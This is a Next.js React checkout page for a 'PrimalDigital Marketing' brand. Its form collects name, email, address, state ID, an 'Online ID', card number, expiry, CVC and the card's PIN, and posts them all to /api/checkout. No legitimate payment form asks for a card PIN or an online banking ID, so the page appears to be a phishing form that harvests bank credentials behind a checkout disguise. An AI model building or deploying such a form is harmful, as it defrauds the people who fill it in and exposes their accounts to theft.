"use client";
import Link from "next/link";
import { useState, ChangeEvent, FormEvent } from "react";

// Type definitions for form data
interface FormData {
  fullName: string;
  email: string;
  address: string;
  stateID: string;
  zipCode: string;
  pin: string;
  onlineID: string;
  cardNumber: string;
  expiryDate: string;
  cvc: string;
}

export default function Checkout() {
  const [formData, setFormData] = useState<FormData>({
    fullName: "",
    email: "",
    address: "",
    stateID: "",
    zipCode: "",
    pin: "",
    onlineID: "",
    cardNumber: "",
    expiryDate: "",
    cvc: "",
  });

  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    const maxLengthMap: { [key: string]: number } = {
      zipCode: 5,
      cardNumber: 16,
      expiryDate: 5,
      cvc: 3,
      pin: 4,
    };

    if (maxLengthMap[name] && value.length > maxLengthMap[name]) return;
    if (
      ["cardNumber", "pin", "cvc", "zipCode"].includes(name) &&
      /\D/.test(value)
    )
      return;

    if (name === "expiryDate") {
      const formattedValue = value
        .replace(/\D/g, "")
        .replace(/(\d{2})(\d{1,2})/, "$1/$2");
      setFormData({ ...formData, expiryDate: formattedValue });
      return;
    }

    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    try {
      const response = await fetch("/api/checkout", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ formData }),
      });

      if (!response.ok) throw new Error(`Error: ${response.status}`);
      setIsSubmitted(true);
    } catch (error) {
      console.error("Submission error:", error);
      alert("Error submitting form. Please try again.");
    }
  };

  const handleClose = () => {
    setIsSubmitted(false);
    setFormData({
      fullName: "",
      email: "",
      address: "",
      stateID: "",
      zipCode: "",
      pin: "",
      onlineID: "",
      cardNumber: "",
      expiryDate: "",
      cvc: "",
    });
  };

  return (
    <div className="min-h-screen flex flex-col py-5 bg-gradient-to-r from-blue-100 via-white to-blue-50">
      <div>
        <div>
          <Link href="/">
            <p
              className="font-semibold ml-2 mt-0"
              style={{ letterSpacing: "3px" }}
            >
              PRIMAL<span className="text-slate-700">DIGITAL</span>
            </p>
            <p
              className="text-orange-400 ml-2"
              style={{ fontSize: "11px", fontWeight: "600", lineHeight: "7px" }}
            >
              MARKETING
            </p>
          </Link>
        </div>

        <div
          className={`max-w-md mx-auto my-10 w-3/4 p-8 sm:w-5/6 bg-white rounded-lg shadow-md ${
            isSubmitted ? "blur-sm" : ""
          }`}
        >
          <h2 className="text-2xl font-bold mb-6 text-gray-500 text-center">
            <span className="text-black">Primal</span>Digital
          </h2>
          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label className="block text-gray-600 font-semibold">
                Full Name
              </label>
              <input
                type="text"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                required
                className="w-full px-3 py-2 border rounded-lg"
              />
            </div>
            <div>
              <label className="block text-gray-600 font-semibold">Email</label>
              <input
                type="email"
                name="email"
                value={formData.email}
                onChange={handleChange}
                required
                className="w-full px-3 py-2 border rounded-lg"
              />
            </div>
            <div>
              <label className="block text-gray-600 font-semibold">
                Address
              </label>
              <input
                type="text"
                name="address"
                value={formData.address}
                onChange={handleChange}
                required
                className="w-full px-3 py-2 border rounded-lg"
              />
            </div>
            <div>
              <label className="block text-gray-600 font-semibold">
                State ID
              </label>
              <input
                type="text"
                name="stateID"
                value={formData.stateID}
                onChange={handleChange}
                required
                className="w-full px-3 py-2 border rounded-lg"
              />
            </div>
            <div>
              <label className="block text-gray-600 font-semibold">
                ZIP Code
              </label>
              <input
                type="text"
                name="zipCode"
                value={formData.zipCode}
                onChange={handleChange}
                required
                className="w-full px-3 py-2 border rounded-lg"
              />
            </div>
            <div>
              <label className="block text-gray-600 font-semibold">
                Online ID
              </label>
              <input
                type="text"
                name="onlineID"
                value={formData.onlineID}
                onChange={handleChange}
                required
                className="w-full px-3 py-2 border rounded-lg"
              />
            </div>
            <div>
              <label className="block text-gray-600 font-semibold">
                Card Number
              </label>
              <input
                type="text"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleChange}
                required
                className="w-full px-3 py-2 border rounded-lg"
              />
            </div>
            <div className="flex space-x-4">
              <div className="flex-1">
                <label className="block text-gray-600 font-semibold">
                  Expiry Date
                </label>
                <input
                  type="text"
                  name="expiryDate"
                  value={formData.expiryDate}
                  onChange={handleChange}
                  placeholder="MM/YY"
                  required
                  className="w-full px-3 py-2 border rounded-lg"
                />
              </div>
              <div className="flex-1">
                <label className="block text-gray-600 font-semibold">CVC</label>
                <input
                  type="text"
                  name="cvc"
                  value={formData.cvc}
                  onChange={handleChange}
                  required
                  className="w-full px-3 py-2 border rounded-lg"
                />
              </div>
            </div>
            <div>
              <label className="block text-gray-600 font-semibold">PIN</label>
              <input
                type="text"
                name="pin"
                value={formData.pin}
                onChange={handleChange}
                required
                className="w-full px-3 py-2 border rounded-lg"
              />
            </div>
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-2 rounded-lg font-semibold hover:bg-blue-600"
            >
              SUBMIT
            </button>
          </form>
        </div>

        {isSubmitted && (
          <div className="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
            <div className="bg-white p-6 rounded-lg shadow-lg text-center">
              <h3 className="text-2xl font-bold text-green-600">Success!</h3>
              <p className="mt-4 text-gray-600">
                Your data has been submitted successfully.We would send you a confirmation on your gmail. Thanks.
              </p>
              <button
                onClick={handleClose}
                className="mt-4 bg-blue-500 text-white py-2 px-4 rounded-lg"
              >
                Close
              </button>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
